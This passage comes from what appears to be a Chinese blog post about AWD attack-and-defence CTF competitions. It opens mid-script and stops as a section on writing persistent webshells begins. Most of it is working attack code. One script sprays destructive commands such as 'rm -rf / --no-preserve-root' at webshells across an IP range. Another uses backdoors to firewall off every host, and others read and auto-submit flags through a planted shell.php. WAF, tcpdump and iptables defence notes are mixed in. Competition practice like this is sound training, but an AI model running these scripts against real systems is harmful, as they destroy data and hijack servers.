    payload=&#123;'cat /flag','ls -al','rm -f','echo 1','echo 1 /proc/sys/net/ipv4/ip_forward','rm -rf / --no-preserve-root'&#125;
    while(1):
        for i in range(1, 50):
            for ii in file:
                url='http://192.168.182.'+ str(i)+'/'+ii
                print(url)
                for iii in payload:
                    data=&#123;
                        'payload':iii
                    &#125;
                    try:
                        requests.post(url,data=data)
                        print(&quot;正在搅屎:&quot;+str(i)+'|'+ii+'|'+iii)
                        time.sleep(0.1)
                    except Exception as e:
                        time.sleep(0.1)
                        pass


if __name__ == '__main__':
    scan_attack()
</code></pre><h2 id="流量分析"><a class="anchor" href="#流量分析">#</a> 流量分析</h2><p>在比赛服务器上抓取流量包，需要的权限比较高，一般比赛用不到</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> tcpdump -s <span class="token number">0</span> -w flow.pcap port <span class="token number">80</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># 然后使用 scp 写个脚本实时将流量包拷贝到本地</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>tcpdump tcp -i eth1 -t -s <span class="token number">0</span> -c <span class="token number">100</span> and dst port <span class="token operator">!</span> <span class="token number">22</span> and src net <span class="token number">192.168</span>.1.0/24 -w ./target.cap</pre></td></tr><tr><td data-num="6"></td><td><pre>命令拆解分析：</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">1</span>、tcp: <span class="token function">ip</span> icmp arp rarp 和 tcp、udp、icmp这些选项等都要放到第一个参数的位置，用来过滤数据报的类型</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">2</span>、-i eth1 <span class="token builtin class-name">:</span> 只抓经过接口eth1的包</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">3</span>、-t <span class="token builtin class-name">:</span> 不显示时间戳</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">4</span>、-s <span class="token number">0</span> <span class="token builtin class-name">:</span> 抓取数据包时默认抓取长度为68字节。加上-S <span class="token number">0</span> 后可以抓到完整的数据包</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">5</span>、-c <span class="token number">100</span> <span class="token builtin class-name">:</span> 只抓取100个数据包</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">6</span>、dst port <span class="token operator">!</span> <span class="token number">22</span> <span class="token builtin class-name">:</span> 不抓取目标端口是22的数据包</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">7</span>、src net <span class="token number">192.168</span>.1.0/24 <span class="token builtin class-name">:</span> 数据包的源网络地址为192.168.1.0/24</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token number">8</span>、-w ./target.cap <span class="token builtin class-name">:</span> 保存成cap文件，方便用wireshark分析</pre></td></tr></table></figure><p>PHP 版流量监控</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span>?php</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>  date_default_timezone_set<span class="token punctuation">(</span><span class="token string">'Asia/Shanghai'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> //记录访问者的ip</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> //访问者要访问的文件名</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token variable">$parameter</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"QUERY_STRING"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> //访问者要请求的参数</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token variable">$time</span> <span class="token operator">=</span> date<span class="token punctuation">(</span><span class="token string">'Y-m-d H:i:s'</span>,time<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span> //访问时间</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token variable">$logadd</span> <span class="token operator">=</span> <span class="token string">'来访时间：'</span><span class="token builtin class-name">.</span><span class="token variable">$time</span><span class="token builtin class-name">.</span><span class="token string">'-->'</span><span class="token builtin class-name">.</span><span class="token string">'访问链接：'</span><span class="token builtin class-name">.</span><span class="token string">'http://'</span><span class="token builtin class-name">.</span><span class="token variable">$ip</span><span class="token builtin class-name">.</span><span class="token variable">$filename</span><span class="token builtin class-name">.</span><span class="token string">'?'</span><span class="token builtin class-name">.</span><span class="token variable">$parameter</span><span class="token builtin class-name">.</span><span class="token string">"<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>// log记录</pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token variable">$fh</span> <span class="token operator">=</span> fopen<span class="token punctuation">(</span><span class="token string">"log.txt"</span>, <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>fwrite<span class="token punctuation">(</span><span class="token variable">$fh</span>, <span class="token variable">$logadd</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>fclose<span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>?<span class="token operator">></span></pre></td></tr></table></figure><p>一个针对 php 的 web 流量抓取、分析的应用：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3d1cGNv">wupco</span>/<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3d1cGNvL3dlYmxvZ2dlcg==">weblogger</span><br>使用方法</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">cd</span> /var/www/html/ <span class="token punctuation">(</span>or other web <span class="token function">dir</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>   <span class="token function">git</span> clone https://github.com/wupco/weblogger.git</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>   <span class="token function">chmod</span> -R <span class="token number">777</span> weblogger/</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>   <span class="token function">open</span> http://xxxxx/weblogger/install.php <span class="token keyword">in</span> Web browser</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>   <span class="token function">install</span> it</pre></td></tr></table></figure><h2><a class="anchor" href="#">#</a></h2><h2 id="waf"><a class="anchor" href="#waf">#</a> WAF</h2><p>waf 的作用：<br>1. 最重要是分析流量，别人攻击我们的时候，我们可以看到别人的攻击方式。这样的话即使我们找 不到攻击点，非常苦恼的时候，我们就可以分析流量，使用别人的攻击方式。<br>2. 可以直接进行防御，类似于一台防火墙（一般的比赛是不允许使用的，毕竟比赛时间短，就根本绕不过去 waf，那比赛就没意思了）</p><p>有些比赛是不允许上通用 waf 的，check 机制可能会 check 到 waf 过滤的参数，导致宕机，waf 部署需要谨慎，还需要注意的是：上完 waf 检查服务是否可用，部分检查允许使用部分小的 waf，会检查页面完整性、服务完整性。</p><p>常用的 waf 使用方法，是用你要保护的文件去包含这个 waf.php。比如说，你要保护 select.php，那么你就在 select.php 里面写上一行 include './waf.php' 或者 require_once ('waf.php');<br>如果你要保护所有文件，那么就在 config 这种配置文件里包含 waf，因为这种 config 的文件，一般会被大部分功能页面调用</p><p>网上很多 waf 脚本，这里介绍几个 waf 项目</p><p><strong>1.AWD_PHP_WAF</strong><br>项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL05vbnVwbGVCcm9rZW4vQVdEX1BIUF9XQUY=">https://github.com/NonupleBroken/AWD_PHP_WAF</span></p><p>使用方法：<br>使用前先修改 config.php 内的密码，密码使用 sha256 加密</p><pre><code>上waf：
$ find . -path ./waffffff -prune -o -type f -name &quot;*.php&quot; -print | xargs sed -i &quot;s/&lt;?php/&lt;?php include_once(\&quot;\/var\/www\/html\/waffffff\/waf.php\&quot;);/g&quot;

下waf：
$ find . -path ./waffffff -prune -o -type f -name &quot;*.php&quot; -print | xargs sed -i &quot;s/&lt;?php include_once(\&quot;\/var\/www\/html\/waffffff\/waf.php\&quot;);/&lt;?php/g&quot;
</code></pre><p>比如访问 web 目录下的 /waffffff/admin.php?password=123456</p><p><strong>2.CTF-WAF</strong><br>项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NoYXJwbGV1bmcvQ1RGLVdBRg==">https://github.com/sharpleung/CTF-WAF</span></p><p><strong>3.awd-watchbird</strong><br>这是个通防 waf，支持流量转发和替换 flag<br>项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xlb2hlYXJ0cy9hd2Qtd2F0Y2hiaXJk">https://github.com/leohearts/awd-watchbird</span></p><p>1. 打包好好之后直接上传到 html 目录下，回到终端，在上传的 waf 目录下，使用命令</p><pre><code>php watchbird.php --install /var/www/html
</code></pre><p>这样就能使每个页面的 php 代码包含到 waf 下</p><p>2. 运行 waf 之后，打开我们的 web 页面，在任意一个 php 页面后面输入？watchbird=ui，就会进入到 waf 配置页面然后设置密码 (注意：第一次打开需要设置密码)</p><p>3. 配置好之后就能进入内部网页</p><p><strong>4.AoiAWD</strong><br>项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Rhc1NlY3VyaXR5LUhhdExhYi9Bb2lBV0Q=">https://github.com/DasSecurity-HatLab/AoiAWD</span></p><p>使用方法：<span class="exturl" data-url="aHR0cHM6Ly93d3cud2xoaGxjLnRvcC9wb3N0cy8xNjY5Mi8=">AoiAWD - 萌新的得分利器</span><br>下载好，自己去编译或者找编译好的直接用</p><h2 id="防御搅屎"><a class="anchor" href="#防御搅屎">#</a> 防御搅屎</h2><p>在加固阶段，每个堡垒机都有一个 Web 在运行。而这些站点可能存在相应的漏洞和后门。基本上都会有 shell 留在隐秘的角落...</p><p>所以我们就可以通过前期搜寻到的后门，进行操作。这里直接用 linux 的防火墙进行关闭即可。</p><p>在正常情况下：这样的话就直接把系统的后门全杀掉了。只允许 22 80 21 端口可以进行访问。</p><p>首先开启 22 80 21</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>iptables -A INPUT -p tcp --dport <span class="token number">80</span> -j ACCEPT</pre></td></tr><tr><td data-num="2"></td><td><pre>iptables -A INPUT -p tcp --dport <span class="token number">22</span> -j ACCEPT</pre></td></tr><tr><td data-num="3"></td><td><pre>iptables -A INPUT -p tcp --dport <span class="token number">21</span> -j ACCEPT</pre></td></tr></table></figure><p>然后关闭</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>iptables -A INPUT -j DROP</pre></td></tr></table></figure><p>在手动一个个连 shell 搅 shi 的话，是非常慢的。于是写了个小脚本。</p><p>遍历整个 IP 段，并将防火墙开启全部屏蔽掉～～</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://192.168.182"</span></pre></td></tr><tr><td data-num="3"></td><td><pre>port<span class="token operator">=</span><span class="token string">'80'</span></pre></td></tr><tr><td data-num="4"></td><td><pre>shell <span class="token operator">=</span> <span class="token string">"/shell.php"</span></pre></td></tr><tr><td data-num="5"></td><td><pre>passwd <span class="token operator">=</span> <span class="token string">"a"</span></pre></td></tr><tr><td data-num="6"></td><td><pre>payloads <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    passwd<span class="token punctuation">:</span><span class="token string">"system(\'iptables -A INPUT -j DROP');"</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    urls <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"."</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>port<span class="token operator">+</span>shell</pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>urls<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>urls<span class="token punctuation">,</span>payloads<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">except</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"未找到主机"</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h1 id="编写批量脚本"><a class="anchor" href="#编写批量脚本">#</a> 编写批量脚本</h1><p>以下脚本来自于我比赛时写的垃圾脚本，大佬勿喷。</p><h3 id="1利用后门getflag"><a class="anchor" href="#1利用后门getflag">#</a> 1. 利用后门 getflag</h3><p>单个 shell 获取 flag</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>url<span class="token operator">=</span><span class="token string">"http://192.168.182.130/include/shell.php"</span></pre></td></tr><tr><td data-num="4"></td><td><pre>passwd<span class="token operator">=</span><span class="token string">"admin_ccmd"</span></pre></td></tr><tr><td data-num="5"></td><td><pre>payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>passwd<span class="token punctuation">:</span> <span class="token string">'system(\'cat /f*\');'</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr></table></figure><h3 id="2后门批量getflag"><a class="anchor" href="#2后门批量getflag">#</a> 2. 后门批量 getflag</h3><p>针对端口变化利用后门批量获取 flag</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>url1<span class="token operator">=</span><span class="token string">"http://192.168.182.130:"</span></pre></td></tr><tr><td data-num="4"></td><td><pre>url2<span class="token operator">=</span><span class="token string">""</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>flaglist<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>path<span class="token operator">=</span><span class="token string">"/include/shell.php"</span></pre></td></tr><tr><td data-num="9"></td><td><pre>passwd<span class="token operator">=</span><span class="token string">"admin_ccmd"</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment">#payload = &#123;passwd: 'system(\'cat /f*\');'&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>passwd<span class="token punctuation">:</span> <span class="token string">'system(\'cat /flag\');'</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>i <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">for</span> url2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8801</span><span class="token punctuation">,</span><span class="token number">8805</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    url <span class="token operator">=</span> url1 <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>url2<span class="token punctuation">)</span> <span class="token operator">+</span>path</pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>    res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>url1 <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>url2<span class="token punctuation">)</span><span class="token punctuation">,</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token comment"># flag 存入列表中</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        flaglist<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token comment">#print(flaglist[i])</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        i <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">except</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token keyword">pass</span></pre></td></tr></table></figure><h3 id="3利用后门批量getflag并提交"><a class="anchor" href="#3利用后门批量getflag并提交">#</a> 3. 利用后门批量 getflag 并提交</h3><p>burp 抓包，发现 flag 以 json 形式传输</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>POST /api/flag HTTP/1.1</pre></td></tr><tr><td data-num="2"></td><td><pre>Host: <span class="token number">192.168</span>.182.130:39999</pre></td></tr><tr><td data-num="3"></td><td><pre>User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:89.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/89.0</pre></td></tr><tr><td data-num="4"></td><td><pre>Accept: application/json, text/plain, */*</pre></td></tr><tr><td data-num="5"></td><td><pre>Accept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,zh-TW<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.7</span>,zh-HK<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>,en-US<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.3</span>,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.2</span></pre></td></tr><tr><td data-num="6"></td><td><pre>Accept-Encoding: gzip, deflate</pre></td></tr><tr><td data-num="7"></td><td><pre>Content-Type: application/json<span class="token punctuation">;</span><span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8</pre></td></tr><tr><td data-num="8"></td><td><pre>Authorization: 9ad36c305d6a2d2514434a4c10e7e13f</pre></td></tr><tr><td data-num="9"></td><td><pre>Content-Length: <span class="token number">55</span></pre></td></tr><tr><td data-num="10"></td><td><pre>Origin: http://192.168.182.130:39999</pre></td></tr><tr><td data-num="11"></td><td><pre>Connection: close</pre></td></tr><tr><td data-num="12"></td><td><pre>Referer: http://192.168.182.130:39999/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#123;</span><span class="token string">"flag"</span><span class="token builtin class-name">:</span><span class="token string">"SL&#123;7a2ecc20361b7a104798b6bba6222b3972e114a2&#125;"</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>编写脚本自动获取 flag 并提交</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># coding: UTF-8</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> json</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>url1<span class="token operator">=</span><span class="token string">"http://xxxx:"</span></pre></td></tr><tr><td data-num="6"></td><td><pre>url2<span class="token operator">=</span><span class="token string">""</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>flaglist<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>path<span class="token operator">=</span><span class="token string">"/include/shell.php"</span></pre></td></tr><tr><td data-num="11"></td><td><pre>passwd<span class="token operator">=</span><span class="token string">"admin_ccmd"</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>flagadd<span class="token operator">=</span><span class="token string">"http://xxxx:8801/api/flag"</span>   <span class="token comment">#提交 flag 的地址</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment">#payload = &#123;passwd: 'system(\'cat /f*\');'&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>passwd<span class="token punctuation">:</span> <span class="token string">'system(\'cat /flag\');'</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>headers<span class="token operator">=</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>headersflag<span class="token operator">=</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token string">'Host'</span><span class="token punctuation">:</span> <span class="token string">'xxxx'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'application/json, text/plain, */*'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json;charset=utf-8'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token string">'Authorization'</span><span class="token punctuation">:</span> <span class="token string">'bada82467423a6526d4d25abbe8cc43a'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token string">'Origin'</span><span class="token punctuation">:</span> <span class="token string">'http://xxxx'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'http://xxxx/'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre>i <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token keyword">for</span> url2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8802</span><span class="token punctuation">,</span><span class="token number">8810</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    url <span class="token operator">=</span> url1 <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>url2<span class="token punctuation">)</span> <span class="token operator">+</span>path</pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token comment">#print(url1 + str(url2))</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>payload<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>url1 <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>url2<span class="token punctuation">)</span><span class="token punctuation">,</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>        <span class="token comment"># flag 存入列表中</span></pre></td></tr><tr><td data-num="42"></td><td><pre>        flaglist<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>        <span class="token comment">#print(flaglist[i])</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        body <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"flag"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>flaglist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>flagadd<span class="token punctuation">,</span> headers<span class="token operator">=</span>headersflag<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre>        i <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token keyword">except</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="48"></td><td><pre>        <span class="token keyword">pass</span></pre></td></tr></table></figure><p>如果嫌写脚本麻烦，可以把 flag 存入字典，利用 burp 爆破，也可以实现批量提交 flag。不过大括号 <code>&#123;&#125;</code> 可能会被编码导致 flag 错误。</p><h3 id="4利用后门写shell"><a class="anchor" href="#4利用后门写shell">#</a> 4. 利用后门写 shell</h3><p>预留后门可能会被删除，要想持续拿分需要写 shell，这里利用命令执行和代码执行来写马<br><strong>利用命令执行写马</strong></p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">1</span>.Linux下写shell</pre></td></tr><tr><td data-num="2"></td><td><pre>$ <span class="token builtin class-name">echo</span> <span class="token 